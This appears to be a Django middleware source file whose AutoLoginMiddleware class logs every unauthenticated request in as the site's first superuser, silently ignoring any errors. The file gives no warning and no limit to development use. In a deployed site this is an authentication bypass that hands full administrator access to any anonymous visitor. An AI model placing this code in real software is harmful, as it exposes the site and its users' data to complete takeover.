class AutoLoginMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        from django.contrib.auth import login
        from django.contrib.auth.models import User
        
        if not request.user.is_authenticated:
            try:
                user = User.objects.filter(is_superuser=True).first()
                if user:
                    login(request, user)
            except:
                pass
        
        return self.get_response(request)
